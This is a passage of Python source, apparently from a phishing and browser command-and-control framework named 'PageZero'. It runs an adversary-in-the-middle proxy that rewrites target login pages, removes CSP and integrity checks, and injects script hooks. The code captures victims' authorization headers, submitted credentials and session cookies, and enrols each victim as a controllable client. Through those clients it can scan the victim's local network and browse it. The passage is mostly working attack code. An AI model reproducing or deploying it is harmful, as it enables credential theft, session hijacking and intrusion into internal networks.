    # Protocol-relative → make absolute using target scheme
    if url.startswith('//'):
        url = urlparse(target_origin).scheme + ':' + url
    abs_url = urljoin(target_origin + '/', url)
    p = urlparse(abs_url)
    if not p.scheme.startswith('http') or not p.netloc:
        return abs_url
    path = p.path or '/'
    qs   = ('?' + p.query)    if p.query    else ''
    frag = ('#' + p.fragment) if p.fragment else ''
    # Encode scheme in prefix: _xs_ = https, _xh_ = http
    pfx = '_xs_' if p.scheme == 'https' else '_xh_'
    return proxy_root.rstrip('/') + '/' + pfx + '/' + p.netloc + path + qs + frag


def _rewrite_html(raw, page_url, proxy_root, cid=None):
    """Rewrite all URLs in HTML, strip security meta, inject hook."""
    target_origin = '{s}://{n}'.format(s=urlparse(page_url).scheme, n=urlparse(page_url).netloc)
    try:
        soup = BeautifulSoup(raw, 'html.parser')
    except Exception:
        return raw

    for tag, attr in [
        ('a','href'),('link','href'),('area','href'),
        ('script','src'),('img','src'),('source','src'),('video','src'),
        ('audio','src'),('iframe','src'),('frame','src'),('embed','src'),
        ('form','action'),('input','formaction'),('button','formaction'),
    ]:
        for t in soup.find_all(tag, **{attr: True}):
            t[attr] = _rewrite_url(t[attr], target_origin, proxy_root)

    for t in soup.find_all(srcset=True):
        parts = []
        for chunk in t['srcset'].split(','):
            chunk = chunk.strip()
            tokens = chunk.split()
            if tokens:
                tokens[0] = _rewrite_url(tokens[0], target_origin, proxy_root)
            parts.append(' '.join(tokens))
        t['srcset'] = ', '.join(parts)

    # Rewrite URL references inside inline <style> blocks
    for t in soup.find_all('style'):
        if t.string:
            rewritten = _rewrite_css(t.string.encode('utf-8', errors='replace'), page_url, proxy_root)
            t.string = rewritten.decode('utf-8', errors='replace')

    # Rewrite url() in style="" attributes
    import re as _re
    for t in soup.find_all(style=True):
        t['style'] = _re.sub(
            r'url\(\s*([^)]+)\s*\)',
            lambda m: 'url(' + _rewrite_url(m.group(1).strip().strip('"\''), target_origin, proxy_root) + ')',
            t['style']
        )

    # Rewrite URLs inside data-* attributes (React apps store config URLs there,
    # e.g. <body data-envs='{"AUTH_SERVER":"https://iam.example.com"}'>)
    _URL_IN_DATA = _re.compile(r'https?://[^\s"\'<>&,;\\}]+')
    for t in soup.find_all(True):
        for attr_name in list(t.attrs.keys()):
            if attr_name.startswith('data-') and isinstance(t[attr_name], str):
                val = t[attr_name]
                if 'http://' in val or 'https://' in val:
                    t[attr_name] = _URL_IN_DATA.sub(
                        lambda m: _rewrite_url(m.group(0), target_origin, proxy_root),
                        val
                    )

    # Nuke CSP / referrer-policy meta
    for t in soup.find_all('meta'):
        he = (t.get('http-equiv') or '').lower()
        if he in ('content-security-policy', 'referrer-policy'):
            t.decompose()

    # Replace any existing <base> with one pointing to the current proxied origin
    # so relative paths in JS-injected content resolve through the right _x_/host/ prefix
    page_parsed   = urlparse(page_url)
    current_netloc = page_parsed.netloc
    current_pfx    = '_xs_' if page_parsed.scheme == 'https' else '_xh_'
    for t in soup.find_all('base'):
        t.decompose()
    base_href = proxy_root.rstrip('/') + '/' + current_pfx + '/' + current_netloc + '/'
    base_tag = soup.new_tag('base', href=base_href)
    if soup.head:
        soup.head.insert(0, base_tag)
    elif soup.body:
        soup.body.insert(0, base_tag)

    # Strip SRI (breaks after injection)
    for t in soup.find_all(integrity=True):
        del t['integrity']

    # Inject runtime fetch/XHR URL rewriter first so all JS API calls stay within the proxy.
    # This catches hardcoded absolute URLs that static HTML rewriting misses
    # (e.g. fetch('https://login.microsoftonline.com/GetCredentialType')).
    # Injection order: rewriter first (patches fetch), then phish_hook (wraps rewriter),
    # so phish_hook captures the ORIGINAL url while the rewriter routes via proxy.
    pz_base   = proxy_root.rstrip('/')          # e.g. http://host:8880/phish
    pz_host   = urlparse(proxy_root).netloc      # e.g. host:8880
    rw = soup.new_tag('script')
    rw.string = (
        "(function(){"
        "'use strict';"
        "var _b=" + json.dumps(pz_base) + ";"
        "var _h=" + json.dumps(pz_host) + ";"
        # The proxy's own origin (scheme+host+port) — used to detect relative URLs
        # that have been resolved against our proxy's location.href
        "var _pzo=location.protocol+'//'+_h;"
        "function rw(u){"
          "if(!u)return u;"
          "try{"
            "var s=typeof u==='string'?u:String(u);"
            "var p=new URL(s,location.href);"
            "if(!p.protocol.startsWith('http'))return u;"
            # Already routed through our proxy (path contains /_xs_/ or /_xh_/)
            "if(p.origin===_pzo&&(p.pathname.indexOf('/_xs_/')>=0||p.pathname.indexOf('/_xh_/')>=0))return p.href;"
            # C2/hook endpoints on the proxy server — don't re-route these
            "if(p.origin===_pzo&&(p.pathname==='/result'||p.pathname==='/collect'||p.pathname==='/__pzcap'||p.pathname.startsWith('/poll/')))return p.href;"
            # URL resolved to the proxy server (relative URL or same scheme+host+port absolute URL)
            # → re-route to the currently-proxied origin extracted from location.pathname
            "if(p.origin===_pzo){"
              "var lp=location.pathname;"
              "var xi=lp.indexOf('/_xs_/');var xs=true;"
              "if(xi<0){xi=lp.indexOf('/_xh_/');xs=false;}"
              "if(xi>=0){"
                "var th=lp.slice(xi+6).split('/')[0];"
                "return _b+(xs?'/_xs_/':'/_xh_/')+th+p.pathname+p.search+p.hash;"
              "}"
              "return u;"
            "}"
            # External URL (different origin) — route through proxy
            "var pfx=p.protocol==='https:'?'/_xs_/':'/_xh_/';"
            "return _b+pfx+p.host+p.pathname+p.search+p.hash;"
          "}catch(e){return u;}"
        "}"
        "var _f=window.fetch;"
        "window.fetch=function(input,opts){"
          "try{"
            "if(typeof input==='string'||input instanceof URL)input=rw(input);"
            "else if(input&&input.url)input=new Request(rw(input.url),input);"
          "}catch(e){}"
          # Use call() not apply(this,arguments) — in strict mode, modifying `input`
          # does NOT update arguments[0], so apply() would pass the original URL.
          "return _f.call(this,input,opts);"
        "};"
        "var _xo=XMLHttpRequest.prototype.open;"
        "XMLHttpRequest.prototype.open=function(m,u){"
          "try{arguments[1]=rw(String(u));}catch(e){}"
          "return _xo.apply(this,arguments);"
        "};"
        # window.location = url  (may be non-configurable in Chrome — separate try so failure
        # does NOT prevent the Location.prototype.href patch below from running)
        "try{"
          "Object.defineProperty(window,'location',{"
            "get:function(){return location;},"
            "set:function(v){location.href=rw(String(v));},"
            "configurable:true"
          "});"
        "}catch(e){}"
        # location.href = url  — Location.prototype.href IS configurable in all browsers
        "try{"
          "var _hd=Object.getOwnPropertyDescriptor(Location.prototype,'href');"
          "Object.defineProperty(Location.prototype,'href',{"
            "get:_hd.get,"
            "set:function(v){_hd.set.call(this,rw(String(v)));},"
            "configurable:true"
          "});"
        "}catch(e){}"
        # location.assign(url) — used by Keycloak JS adapter
        "try{"
          "var _la=Location.prototype.assign;"
          "Location.prototype.assign=function(v){_la.call(this,rw(String(v)));};"
        "}catch(e){}"
        # location.replace(url) — used by some SPA routers
        "try{"
          "var _lr=Location.prototype.replace;"
          "Location.prototype.replace=function(v){_lr.call(this,rw(String(v)));};"
        "}catch(e){}"
        # window.open
        "try{"
          "var _wo=window.open;"
          "window.open=function(u,t,f){return _wo.call(this,rw(u||''),t,f);};"
        "}catch(e){}"
        # form.submit() — Microsoft auth uses hidden auto-POST forms
        "try{"
          "var _fs=HTMLFormElement.prototype.submit;"
          "HTMLFormElement.prototype.submit=function(){"
            "try{if(this.action)this.action=rw(this.action);}catch(e){}"
            "return _fs.call(this);"
          "};"
        "}catch(e){}"
        # form.action setter — catch JS setting form.action dynamically
        "try{"
          "var _fad=Object.getOwnPropertyDescriptor(HTMLFormElement.prototype,'action');"
          "if(_fad&&_fad.set){"
            "Object.defineProperty(HTMLFormElement.prototype,'action',{"
              "get:_fad.get,"
              "set:function(v){_fad.set.call(this,rw(String(v)));},"
              "configurable:true"
            "});"
          "}"
        "}catch(e){}"
        # a.href setter — catch JS creating anchors with absolute URLs then clicking them
        "try{"
          "var _ahd=Object.getOwnPropertyDescriptor(HTMLAnchorElement.prototype,'href');"
          "if(_ahd&&_ahd.set){"
            "Object.defineProperty(HTMLAnchorElement.prototype,'href',{"
              "get:_ahd.get,"
              "set:function(v){_ahd.set.call(this,rw(String(v)));},"
              "configurable:true"
            "});"
          "}"
        "}catch(e){}"
        # MutationObserver — rewrite URLs on any dynamically inserted elements
        "try{"
          "var _rwAttrs={'href':1,'src':1,'action':1,'formaction':1};"
          "var _obs=new MutationObserver(function(muts){"
            "muts.forEach(function(m){"
              "if(m.type==='childList'){"
                "m.addedNodes.forEach(function(n){"
                  "if(n.nodeType!==1)return;"
                  "var els=n.querySelectorAll?[n].concat(Array.from(n.querySelectorAll('*'))):[n];"
                  "els.forEach(function(el){"
                    "for(var a in _rwAttrs){"
                      "var v=el.getAttribute&&el.getAttribute(a);"
                      "if(v&&/^https?:\\/\\//.test(v)){el.setAttribute(a,rw(v));}"
                    "}"
                  "});"
                "});"
              "}"
            "});"
          "});"
          "_obs.observe(document.documentElement||document,{childList:true,subtree:true});"
        "}catch(e){}"
        "})();"
    )
    # Inject phish_hook second (wraps the rewriter — captures original URL, then rewriter proxies it)
    hook = soup.new_tag('script')
    hook.string = _PHISH_HOOK_JS
    target_el = soup.head or soup.body or soup
    target_el.insert(0, hook)
    target_el.insert(0, rw)

    # Inject C2 bootstrap so phish victims appear as controllable clients
    if cid:
        c2 = soup.new_tag('script')
        c2.string = _C2_BOOTSTRAP_JS.replace('{{cid}}', cid)
        if soup.head:
            soup.head.append(c2)
        elif soup.body:
            soup.body.append(c2)
        else:
            soup.append(c2)

    return str(soup).encode('utf-8', errors='replace')


def _rewrite_css(raw, page_url, proxy_root):
    """Rewrite url() references inside CSS."""
    target_origin = '{s}://{n}'.format(s=urlparse(page_url).scheme, n=urlparse(page_url).netloc)
    try:
        text = raw.decode('utf-8', errors='replace')
    except Exception:
        return raw
    def _sub(m):
        inner = m.group(1).strip().strip('"\'')
        return 'url(' + _rewrite_url(inner, target_origin, proxy_root) + ')'
    return re.sub(r'url\(\s*([^)]+)\s*\)', _sub, text).encode('utf-8', errors='replace')


def _rewrite_js(raw, target_origin, proxy_root):
    """Replace literal origin strings in JS so fetch/XHR calls go through proxy."""
    try:
        text = raw.decode('utf-8', errors='replace')
    except Exception:
        return raw
    proxy_base = proxy_root.rstrip('/')
    # Replace quoted origin literals  e.g.  "https://accounts.google.com"
    text = text.replace('"' + target_origin + '"', '"' + proxy_base + '"')
    text = text.replace("'" + target_origin + "'", "'" + proxy_base + "'")
    # Protocol-relative variant
    pr = '//' + urlparse(target_origin).netloc
    text = text.replace('"' + pr + '"', '"' + proxy_base + '"')
    text = text.replace("'" + pr + "'", "'" + proxy_base + "'")
    return text.encode('utf-8', errors='replace')


def _strip_cookie(raw_cookie):
    """Strip Secure/Domain/SameSite/Path so cookie lands over plain HTTP on our domain at all paths."""
    c = re.sub(r';\s*Secure\b',           '',  raw_cookie, flags=re.I)
    c = re.sub(r';\s*Domain=[^;,]+',      '',  c,          flags=re.I)
    c = re.sub(r';\s*SameSite=[^;,]+',    '',  c,          flags=re.I)
    c = re.sub(r';\s*Partitioned\b',      '',  c,          flags=re.I)
    c = re.sub(r';\s*Path=[^;,]+',        '',  c,          flags=re.I)
    c = c.strip().rstrip(';')
    return c + '; Path=/'


# ── Capture endpoint (same-origin beacon from hook JS) ────────────────────────
@app.route('/__pzcap', methods=['POST'])
def pzcap():
    raw = request.get_data(as_text=True)
    try:
        parsed = json.loads(raw)
    except Exception:
        parsed = {'raw': raw}
    sid      = request.cookies.get('__pzsid', '?')
    cid_hook = request.cookies.get('cid', '?')
    campaign = request.cookies.get('__pzcampaign', None)
    phish_captures.append({
        'ts': time.time(), 'ip': request.remote_addr,
        'sid': sid, 'cid': cid_hook, 'campaign': campaign,
        **parsed
    })
    if len(phish_captures) > 5000:
        phish_captures[:] = phish_captures[-5000:]
    return '', 204


# ── Main proxy route ──────────────────────────────────────────────────────────
@app.route('/phish', defaults={'path': ''}, methods=['GET','POST','PUT','PATCH','DELETE','HEAD','OPTIONS'])
@app.route('/phish/<path:path>',            methods=['GET','POST','PUT','PATCH','DELETE','HEAD','OPTIONS'])
def phish_proxy(path):
    target = phish_config.get('target')
    if not target:
        return 'No target configured — set one in the PageZero admin panel.', 404

    # Handle OPTIONS preflight directly — never forward to upstream
    if request.method == 'OPTIONS':
        origin = request.headers.get('Origin', '*')
        resp = make_response('', 204)
        resp.headers['Access-Control-Allow-Origin'] = origin
        resp.headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, PATCH, DELETE, HEAD, OPTIONS'
        resp.headers['Access-Control-Allow-Headers'] = request.headers.get('Access-Control-Request-Headers', '*')
        resp.headers['Access-Control-Allow-Credentials'] = 'true'
        resp.headers['Access-Control-Max-Age'] = '86400'
        return resp

    # Campaign entry point: /phish/c/<token>[/rest] — strip token from path
    campaign_entry = False
    campaign_token = request.cookies.get('__pzcampaign')
    if path == 'c' or path.startswith('c/'):
        parts = path.split('/', 2)
        tok = parts[1] if len(parts) > 1 else ''
        if tok and tok in phish_campaigns:
            campaign_token = tok
            campaign_entry = True
            path = parts[2] if len(parts) > 2 else ''
        else:
            return 'Campaign link not found or expired.', 404

    parsed_target = urlparse(target)
    target_origin = f'{parsed_target.scheme}://{parsed_target.netloc}'
    proxy_root    = request.host_url + 'phish/'

    # Per-victim session tracking
    sid = request.cookies.get('__pzsid') or secrets.token_hex(12)
    vs  = _get_phish_session(sid)

    # Register phish visitor as a C2 client so they appear in the admin panel
    now = time.time()
    cid = request.cookies.get('cid') or secrets.token_hex(8)
    is_new       = cid not in clients
    was_phish    = clients.get(cid, {}).get('phish', False)
    clients.setdefault(cid, {"first_seen": now})
    clients[cid].update({"ip": request.remote_addr, "ua": request.headers.get("User-Agent", ""),
                          "last_seen": now, "phish": True})
    # Push SSE if: brand-new client OR existing C2 client appearing via phish for first time
    if is_new or not was_phish:
        _sse_push("client_update", {"cid": cid, "ip": request.remote_addr,
                                    "ua": request.headers.get("User-Agent", ""),
                                    "first_seen": clients[cid]["first_seen"],
                                    "online": True, "phish": True,
                                    "campaign": campaign_token})

    # Track campaign victim
    if campaign_token and campaign_token in phish_campaigns:
        camp = phish_campaigns[campaign_token]
        if cid not in camp['cids']:
            camp['cids'].append(cid)

    # Build upstream URL — decode _xs_/host/path (https) or _xh_/host/path (http)
    if path.startswith('_xs_/') or path.startswith('_xh_/'):
        real_scheme = 'https' if path.startswith('_xs_/') else 'http'
        after = path[5:]   # strip '_xs_/' or '_xh_/'
        real_host, _, rest = after.partition('/')
        real_path = '/' + rest if rest else '/'
        real_origin = f'{real_scheme}://{real_host}'
    elif not path:
        real_origin = target_origin
        real_path   = parsed_target.path or '/'
    else:
        real_origin = target_origin
        real_path   = '/' + path

    real_url = real_origin + real_path
    if request.query_string:
        real_url += '?' + request.query_string.decode('utf-8', errors='replace')

    real_parsed = urlparse(real_url)

    # Forward request headers (swap Host to match the actual upstream)
    fwd = {'Host': real_parsed.netloc,
           'Accept-Encoding': 'gzip, deflate',
           'Accept': request.headers.get('Accept', '*/*')}
    for k, v in request.headers:
        kl = k.lower()
        if kl in _PROXY_SKIP_REQ:
            continue
        # Un-rewrite Referer/Origin so upstream sees the real origin, not proxy URLs
        if kl == 'referer':
            v = re.sub(r'https?://[^/]+/phish/_xs_/([^/]+)', r'https://\1', v)
            v = re.sub(r'https?://[^/]+/phish/_xh_/([^/]+)', r'http://\1', v)
            v = re.sub(r'https?://[^/]+/phish/?', real_origin + '/', v)
        elif kl == 'origin':
            v = real_origin
        fwd[k] = v

    # Capture request headers — always log Authorization, log all headers on POST/PUT/PATCH
    req_hdrs = {k: v for k, v in request.headers if k.lower() not in
                ('host', 'cookie', 'content-length', 'connection', 'accept-encoding')}
    auth = req_hdrs.get('Authorization') or req_hdrs.get('authorization')
    if auth or request.method in ('POST', 'PUT', 'PATCH'):
        phish_captures.append({
            'ts': time.time(), 'ip': request.remote_addr, 'sid': sid,
            'cid': cid, 'campaign': campaign_token,
            'type': 'request_headers', 'url': real_url,
            'method': request.method, 'data': req_hdrs
        })

    # Capture POST body
    body_bytes = request.get_data() or None
    if body_bytes and request.method in ('POST', 'PUT', 'PATCH'):
        try:
            decoded = body_bytes.decode('utf-8', errors='replace')
            phish_captures.append({
                'ts': time.time(), 'ip': request.remote_addr, 'sid': sid,
                'cid': cid, 'campaign': campaign_token,
                'type': 'post_body', 'url': real_url, 'data': decoded
            })
        except Exception:
            pass

    # Un-rewrite proxy URLs back to real URLs in query strings and POST bodies
    # so OAuth redirect_uri params (etc.) pass upstream validation.
    def _unrewrite(text):
        """Replace proxy-encoded URLs back to their real form."""
        import re as _re2
        # Unencoded form: http://host:port/phish/_xs_/realhost/path → https://realhost/path
        text = _re2.sub(
            r'https?://[^/\s"\']+/phish/_xs_/([^/\s"\'&]+)(/[^\s"\'&]*)?',
            lambda m: 'https://' + m.group(1) + (m.group(2) or ''),
            text
        )
        text = _re2.sub(
            r'https?://[^/\s"\']+/phish/_xh_/([^/\s"\'&]+)(/[^\s"\'&]*)?',
            lambda m: 'http://' + m.group(1) + (m.group(2) or ''),
            text
        )
        # URL-encoded form: http%3A%2F%2Fhost%3Aport%2Fphish%2F_xs_%2Frealhost%2Fpath → https%3A%2F%2Frealhost%2Fpath
        text = _re2.sub(
            r'https?%3A%2F%2F[^%/\s"\'&]+(?:%3A\d+)?%2Fphish%2F_xs_%2F([^%\s"\'&]+)((?:%2F[^&\s"\']*)?)',
            lambda m: 'https%3A%2F%2F' + m.group(1) + (m.group(2) or ''),
            text,
            flags=_re2.IGNORECASE
        )
        text = _re2.sub(
            r'https?%3A%2F%2F[^%/\s"\'&]+(?:%3A\d+)?%2Fphish%2F_xh_%2F([^%\s"\'&]+)((?:%2F[^&\s"\']*)?)',
            lambda m: 'http%3A%2F%2F' + m.group(1) + (m.group(2) or ''),
            text,
            flags=_re2.IGNORECASE
        )
        return text

    # Un-rewrite query string
    if request.query_string:
        qs_text = request.query_string.decode('utf-8', errors='replace')
        qs_clean = _unrewrite(qs_text)
        if qs_clean != qs_text:
            real_url = real_origin + real_path + '?' + qs_clean

    # Un-rewrite POST/PUT/PATCH body
    if body_bytes and request.method in ('POST', 'PUT', 'PATCH'):
        try:
            body_text = body_bytes.decode('utf-8', errors='replace')
            body_clean = _unrewrite(body_text)
            if body_clean != body_text:
                body_bytes = body_clean.encode('utf-8')
        except Exception:
            pass

    # Upstream request via victim session (carries accumulated cookies)
    try:
        resp = vs.request(
            method          = request.method,
            url             = real_url,
            headers         = fwd,
            data            = body_bytes,
            allow_redirects = False,
            timeout         = 20,
        )
    except Exception as e:
        return f'Proxy error: {e}', 502

    ct          = resp.headers.get('Content-Type', '')
    body        = resp.content   # already decoded by requests (handles gzip etc.)

    # Rewrite body based on content type; pass everything else through untouched
    is_html = 'text/html' in ct
    is_css  = 'text/css'  in ct
    is_js   = 'javascript' in ct or 'ecmascript' in ct
    if is_html:
        body = _rewrite_html(body, real_url, proxy_root, cid=cid)
    elif is_css:
        body = _rewrite_css(body, real_url, proxy_root)
    elif is_js:
        body = _rewrite_js(body, real_origin, proxy_root)
    # all other types (images, fonts, wasm, json, binary) pass through as-is

    # Build Flask response
    flask_resp = make_response(body, resp.status_code)

    # Forward safe response headers
    for k, v in resp.headers.items():
        kl = k.lower()
        if kl in _PROXY_SKIP_RESP:
            continue
        if kl == 'location':
            v = _rewrite_url(v, real_origin, proxy_root)
        flask_resp.headers[k] = v

    # Always set correct content-type (rewriting may change charset)
    if 'text/html' in ct:
        flask_resp.headers['Content-Type'] = 'text/html; charset=utf-8'
    elif 'text/css' in ct:
        flask_resp.headers['Content-Type'] = 'text/css; charset=utf-8'

    # Prevent browser caching so switching targets takes effect immediately
    flask_resp.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate'
    flask_resp.headers['Pragma'] = 'no-cache'

    # CORS: always set our own headers so browser allows JS to read responses
    requesting_origin = request.headers.get('Origin')
    if requesting_origin:
        flask_resp.headers['Access-Control-Allow-Origin'] = requesting_origin
        flask_resp.headers['Access-Control-Allow-Credentials'] = 'true'
    else:
        flask_resp.headers['Access-Control-Allow-Origin'] = '*'
    flask_resp.headers['Access-Control-Expose-Headers'] = '*'

    # Capture + forward Set-Cookie headers
    for raw_ck in resp.raw.headers.getlist('Set-Cookie'):
        phish_captures.append({
            'ts': time.time(), 'ip': request.remote_addr, 'sid': sid,
            'cid': cid, 'campaign': campaign_token,
            'type': 'set_cookie', 'url': real_url, 'data': raw_ck
        })
        flask_resp.headers.add('Set-Cookie', _strip_cookie(raw_ck))

    # Dump accumulated session cookies into captures (so we always have latest)
    if vs.cookies:
        jar = {c.name: c.value for c in vs.cookies}
        phish_captures.append({
            'ts': time.time(), 'ip': request.remote_addr, 'sid': sid,
            'cid': cid, 'campaign': campaign_token,
            'type': 'session_cookies', 'url': real_url, 'data': jar
        })

    # Set victim session ID cookie (httponly=False so JS hook can read it)
    flask_resp.set_cookie('__pzsid', sid, max_age=86400 * 7, httponly=False)
    # Persist campaign cookie for subsequent requests
    if campaign_entry and campaign_token:
        flask_resp.set_cookie('__pzcampaign', campaign_token, max_age=86400 * 30, httponly=False)
    # Set C2 client ID cookie so returning visitors keep the same cid
    flask_resp.set_cookie('cid', cid, max_age=86400 * 30, httponly=False)
    return flask_resp


# ── Proxy admin API ───────────────────────────────────────────────────────────
@app.route('/api/phish/config', methods=['POST'])
def api_phish_config():
    if not session.get('admin'):
        return 'forbidden', 403
    body   = request.get_json(silent=True) or {}
    target = body.get('target', '').strip() or None
    operator = session.get("operator", "unknown")
    warning  = None
    if target:
        eng_ok, eng_reason = _engagement_ok()
        if not eng_ok:
            warning = eng_reason
        elif not _target_in_scope(target):
            warning = f"Target not in authorized_domains: {active_engagement.get('authorized_domains', [])}"
    audit(operator, "PHISH_TARGET_SET", {
        "target": target, "previous": phish_config.get("target"),
        "engagement": active_engagement.get("id"),
        "warning": warning
    })
    phish_config['target'] = target
    # Clear old sessions so stale cookies from the previous target don't persist
    phish_sessions.clear()
    phish_captures.clear()
    return jsonify(ok=True, target=phish_config['target'])


@app.route('/api/phish/captures')
def api_phish_captures():
    if not session.get('admin'):
        return 'forbidden', 403
    return jsonify(captures=list(reversed(phish_captures))[:300], total=len(phish_captures))


@app.route('/api/phish/clear', methods=['POST'])
def api_phish_clear():
    if not session.get('admin'):
        return 'forbidden', 403
    phish_captures.clear()
    return jsonify(ok=True)


# ── Campaign management ───────────────────────────────────────────────────────
@app.route('/api/phish/campaigns', methods=['GET'])
def api_campaigns_list():
    if not session.get('admin'):
        return 'forbidden', 403
    out = []
    for token, c in phish_campaigns.items():
        out.append({
            'token':        token,
            'label':        c.get('label', ''),
            'created':      c.get('created', 0),
            'victim_count': len(c.get('cids', [])),
            'link':         request.host_url + 'phish/c/' + token,
        })
    return jsonify(campaigns=out)


@app.route('/api/phish/campaigns', methods=['POST'])
def api_campaigns_create():
    if not session.get('admin'):
        return 'forbidden', 403
    body  = request.get_json(silent=True) or {}
    label = body.get('label', '').strip() or 'Campaign'
    token = secrets.token_urlsafe(8)
    phish_campaigns[token] = {'label': label, 'created': time.time(), 'cids': []}
    link  = request.host_url + 'phish/c/' + token
    return jsonify(ok=True, token=token, label=label, link=link)


@app.route('/api/phish/campaigns/<token>', methods=['DELETE'])
def api_campaigns_delete(token):
    if not session.get('admin'):
        return 'forbidden', 403
    phish_campaigns.pop(token, None)
    return jsonify(ok=True)


@app.route('/api/phish/captures/campaign/<token>')
def api_captures_by_campaign(token):
    if not session.get('admin'):
        return 'forbidden', 403
    filtered = [c for c in phish_captures if c.get('campaign') == token]
    return jsonify(captures=list(reversed(filtered))[:300], total=len(filtered))


# ── Network map API ───────────────────────────────────────────────────────────

def _network_map_json():
    """Return network_map as a serializable list."""
    return list(network_map.values())


@app.route('/api/network/map')
def api_network_map():
    if not session.get('admin'):
        return 'forbidden', 403
    return jsonify(hosts=_network_map_json())


@app.route('/api/network/clear', methods=['POST'])
def api_network_clear():
    if not session.get('admin'):
        return 'forbidden', 403
    network_map.clear()
    return jsonify(ok=True)


@app.route('/api/network/scan', methods=['POST'])
def api_network_scan():
    """Launch a net_scan on specified client(s) from the Network tab."""
    if not session.get('admin'):
        return 'forbidden', 403
    body = request.get_json(silent=True) or {}
    target_cid = body.get('cid', 'all')
    param      = body.get('param', '')  # e.g. "192.168.1.0/24 80,443,8080"

    # Find the net_scan module
    mod = next((m for m in MODULES if m['id'] == 'net_scan'), None)
    if not mod:
        return jsonify(ok=False, error='net_scan module not found'), 404

    js = mod['js'].replace('{{param}}', param.replace("\\", "\\\\").replace("'", "\\'"))
    now = time.time()
    count = 0

    if target_cid == 'all':
        for cid_key in list(clients.keys()):
            if now - clients[cid_key].get('last_seen', 0) < TIMEOUT:
                cmd = {"id": uuid.uuid4().hex, "module_id": "net_scan",
                       "name": "LAN Scanner", "js": js, "ts": now}
                cmd_queue.setdefault(cid_key, []).append(cmd)
                cmd_results.setdefault(cid_key, []).append(
                    {"cmd_id": cmd["id"], "module_name": "LAN Scanner", "result": None, "ts": now})
                count += 1
    else:
        cmd = {"id": uuid.uuid4().hex, "module_id": "net_scan",
               "name": "LAN Scanner", "js": js, "ts": now}
        cmd_queue.setdefault(target_cid, []).append(cmd)
        cmd_results.setdefault(target_cid, []).append(
            {"cmd_id": cmd["id"], "module_name": "LAN Scanner", "result": None, "ts": now})
        count = 1

    return jsonify(ok=True, count=count)


# ── LAN Proxy — full browsing proxy through client's browser ─────────────────

import base64 as _b64

_lan_proxy_sessions = {}   # session_id -> {cid, base_url, scheme, host, ts}
_lan_proxy_pending  = {}   # cmd_id -> {event: threading.Event, result: None}
_lan_proxy_lock     = threading.Lock()

def _lan_proxy_deliver(cmd_id, result):
    """Called from /result endpoint when a lan_proxy result arrives."""
    with _lan_proxy_lock:
        pending = _lan_proxy_pending.get(cmd_id)
        if pending:
            pending['result'] = result
            pending['event'].set()


def _lan_proxy_fetch(cid, target_url, timeout=20):
    """Send lan_proxy command to client, block until result arrives."""
    mod = next((m for m in MODULES if m['id'] == 'lan_proxy'), None)
    if not mod:
        return {'ok': False, 'error': 'lan_proxy module not found'}

    js = mod['js'].replace('{{param}}', target_url.replace("\\", "\\\\").replace("'", "\\'"))
    now = time.time()
    cmd_id = uuid.uuid4().hex

    # Register pending slot BEFORE queuing the command
    evt = threading.Event()
    with _lan_proxy_lock:
        _lan_proxy_pending[cmd_id] = {'event': evt, 'result': None}

    cmd = {"id": cmd_id, "module_id": "lan_proxy",
           "name": "LAN Proxy Fetch", "js": js, "ts": now}
    cmd_queue.setdefault(cid, []).append(cmd)
    cmd_results.setdefault(cid, []).append(
        {"cmd_id": cmd_id, "module_name": "LAN Proxy Fetch", "result": None, "ts": now})

    # Block until client responds or timeout
    evt.wait(timeout=timeout)

    with _lan_proxy_lock:
        pending = _lan_proxy_pending.pop(cmd_id, {})
        result = pending.get('result')

    if result is None:
        return {'ok': False, 'error': f'Timeout — client did not respond within {timeout}s'}
    if isinstance(result, str):
        return {'ok': False, 'error': result}
    return result


def _rewrite_html_urls(html_body, proxy_base_path, target_base_url):
    """Rewrite URLs in HTML so they route through the LAN proxy."""
    # Rewrite absolute URLs pointing to the target host
    parsed = urlparse(target_base_url)
    origin = f"{parsed.scheme}://{parsed.netloc}"

    # Replace href="http://target:port/..." and src="http://target:port/..."
    def _rewrite_attr(m):
        prefix = m.group(1)   # href=" or src=" etc.
        url = m.group(2)
        if url.startswith(origin):
            return prefix + proxy_base_path + url[len(origin):]
        if url.startswith('/') and not url.startswith('//'):
            return prefix + proxy_base_path + url
        return m.group(0)

    # Match src="...", href="...", action="..."
    html_body = re.sub(
        r'''((?:src|href|action)\s*=\s*["'])([^"']*?)(["'])''',
        lambda m: _rewrite_attr(m) + m.group(3) if m.group(2) else m.group(0),
        html_body, flags=re.IGNORECASE
    )

    # Also rewrite url() in inline styles
    def _rewrite_url_func(m):
        url = m.group(1)
        if url.startswith(origin):
            return f"url({proxy_base_path}{url[len(origin):]})"
        if url.startswith('/') and not url.startswith('//'):
            return f"url({proxy_base_path}{url})"
        return m.group(0)

    html_body = re.sub(r'url\(([^)]+)\)', _rewrite_url_func, html_body)

    return html_body


def _rewrite_css_urls(css_body, proxy_base_path, target_base_url):
    """Rewrite url() references in CSS to route through the proxy."""
    parsed = urlparse(target_base_url)
    origin = f"{parsed.scheme}://{parsed.netloc}"

    def _rewrite(m):
        q = m.group(1) or ''  # quote char
        url = m.group(2)
        if url.startswith(origin):
            return f"url({q}{proxy_base_path}{url[len(origin):]}{q})"
        if url.startswith('/') and not url.startswith('//'):
            return f"url({q}{proxy_base_path}{url}{q})"
        return m.group(0)

    return re.sub(r'''url\(\s*(['"]?)([^)'"]+)\1\s*\)''', _rewrite, css_body)


@app.route('/api/network/proxy', methods=['POST'])
def api_network_proxy():
    """Create a LAN proxy session — returns session_id for browsing."""
    if not session.get('admin'):
        return 'forbidden', 403
    body = request.get_json(silent=True) or {}
    cid = body.get('cid', '')
    target_url = body.get('url', '')
    if not cid or not target_url:
        return jsonify(ok=False, error='cid and url required'), 400
    if cid not in clients:
        return jsonify(ok=False, error='Client not found'), 404

    # Normalize target URL
    if not target_url.startswith('http'):
        target_url = 'http://' + target_url
    parsed = urlparse(target_url)
    base_url = f"{parsed.scheme}://{parsed.netloc}"

    session_id = uuid.uuid4().hex[:12]
    _lan_proxy_sessions[session_id] = {
        'cid': cid, 'base_url': base_url,
        'scheme': parsed.scheme, 'host': parsed.netloc,
        'initial_path': parsed.path or '/',
        'ts': time.time()
    }

    # Return the URL the admin should open
    initial_path = parsed.path or '/'
    return jsonify(ok=True, session_id=session_id,
                   browse_url=f'/lanproxy/{session_id}{initial_path}')


@app.route('/lanproxy/<session_id>/', defaults={'subpath': ''})
@app.route('/lanproxy/<session_id>/<path:subpath>')
def lan_proxy_view(session_id, subpath):
